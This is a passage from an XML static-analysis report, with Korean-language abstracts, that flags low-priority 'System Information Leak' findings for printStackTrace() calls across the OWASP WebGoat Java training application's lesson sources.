				s.setMessage( "Error authorizing" );
				sqle.printStackTrace();
			}
		}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2AB41AE8E1843F47BA77436620AA16AB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ThreadSafetyProblem.java의 handleRequest() 함수는 217 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>217</LineStart>
<Snippet>	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1D501737C15AE10645708C25342F008F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonAdapter.java의 createStagedContent() 함수는 137 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>137</LineStart>
<Snippet>	    s.setMessage("Error generating " + this.getClass().getName());
	    System.out.println(e);
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4C653A33A0D6848A352377AB4CBAB1AD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 getStations() 함수는 323 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>323</LineStart>
<Snippet>	catch (SQLException sqle)
	{
	    sqle.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8C48CE78706C16033CB0373C60EBF66E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile() 함수는 299 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>299</LineStart>
<Snippet>	    catch (SQLException sqle)
	    {
		sqle.printStackTrace();
		s.setMessage("Error updating employee profile");
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7506F4DA48F6F86385C9F1B201CA3849" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 getAllEmployees() 함수는 252 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>252</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E8F7B8415D904326CE5A76C29F60DD94" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>FindProfile.java의 handleRequest() 함수는 84 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>84</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}
		catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5C63D969F93AD4F6406AD4E5C137651D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HttpSplitting.java의 doHTTPSplitting() 함수는 137 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>137</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AD7C11D3EB0D8558FDC22AB525483F1A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 deleteEmployeeProfile_BACKUP() 함수는 149 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    {
		s.setMessage("Error deleting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="34F7DA75494088350E0041164CF31E69" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 handleRequest() 함수는 115 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="ABD8BC13CE60A8E57DCFA6DABD7C58FD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 함수는 223 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>223</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8E8BA4B0E6CF6803058E507305B358C3" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 doChangeEmployeeProfile_BACKUP() 함수는 302 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>302</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F8A0BE43919B1CC24D313FC8505FB218" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 63 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>63</LineStart>
<Snippet>	{
	    System.out.println("Failed to load DB driver");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="15A52F2B4AB4C9974369F7251DBFB23C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 getAllEmployees() 함수는 258 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>258</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9F51D6250F83EF2B7731EF14E7136769" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HttpOnly.java의 createContent() 함수는 138 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>138</LineStart>
<Snippet>		{
			s.setMessage( "Error generating " + this.getClass().getName() );
			e.printStackTrace();
		}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A43277672E8AE03DDDA5863F1377295E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 handleRequest() 함수는 86 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>86</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9BCB204A4306E1E6CB007BE7A2EE0469" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WSDLScanning.java의 accessWGService() 함수는 155 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>155</LineStart>
<Snippet>	catch (RemoteException e)
	{
	    e.printStackTrace();
	}
	catch (ServiceException e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="95782931E073FCBD728BDF3DA7F39E90" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HttpOnly.java의 createCustomCookieValue() 함수는 183 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>183</LineStart>
<Snippet>			
		} catch (Exception e) {
			e.printStackTrace();
		}
		</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="784F6C1C531B36F70C18F0DABF1C7DCA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest_BACKUP() 함수는 445 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>445</LineStart>
<Snippet>		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="81034BADE3549CFFE651854181BA6561" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 isAuthorizedForEmployee() 함수는 326 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>326</LineStart>
<Snippet>		{
			s.setMessage( "Error authorizing" );
			e.printStackTrace();
		}
		</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FCD568019EB69AF39AA163B0918E3C7F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 handleRequest() 함수는 91 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>91</LineStart>
<Snippet>		{
		    System.out.println("Internal server error");
		    ue1.printStackTrace();
		}
		catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C96F82E5F189CA5A0B7AAB52DD930CAB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SqlStringInjection.java의 handleRequest() 함수는 317 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>317</LineStart>
<Snippet>	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A74A9A8AC3B36246B6F2AAA5700D66AC" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile_BACKUP() 함수는 192 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>192</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="031C838BEA3E68948136390E110422AA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CrossSiteScripting.java의 handleRequest() 함수는 373 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>373</LineStart>
<Snippet>		s.setMessage("Login failed");
		System.out.println("Authentication failure");
		ue.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4C58672C07CE0B3888AD33A0CFF3D994" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest() 함수는 338 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>338</LineStart>
<Snippet>	{
	    System.out.println("Missing parameter");
	    pnfe.printStackTrace();
	    setCurrentAction(s, ERROR_ACTION);
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AD77F23B2F560ACFD13DFB3502BC039A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DOS_Login.java의 createContent() 함수는 172 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>172</LineStart>
<Snippet>	    {
		ec.addElement(new P().addElement(sqle.getMessage()));
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F8A0BE43919B1CC24D313FC8505FB217" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 78 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>78</LineStart>
<Snippet>	{
	    System.out.println("Driver Manager failed!");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EE0D0F6E41CCBAFA3ACD09D5E3B4810A" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SoapRequest.java의 viewWsdl() 함수는 273 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>273</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B1D0DC02CF0F0466CA099B070DE0D4F7" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewDatabase.java의 createContent() 함수는 105 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewDatabase.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ViewDatabase.java</FilePath>
<LineStart>105</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1A29C2FBFDD046228D0B134428F51657" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login() 함수는 163 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    {
		s.setMessage("Error logging in");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8BD6B7903C38236E8FA6C3B3480A6A40" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile_BACKUP() 함수는 186 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>186</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2C6E09CD1E289637CD671775BC99CADE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SQLInjection.java의 handleRequest() 함수는 348 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>348</LineStart>
<Snippet>	    {
		System.out.println("Validation failed");
		ve.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="51D7D308BD3345DCA7B15A0BEB7EBE70" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AccessControlMatrix.java의 createContent() 함수는 114 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AccessControlMatrix.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AccessControlMatrix.java</FilePath>
<LineStart>114</LineStart>
<Snippet>		{
		    s.setMessage("Error generating " + this.getClass().getName());
		    e.printStackTrace();
		}
	</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FF10EE5C1C632AD667838979FD8C253C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
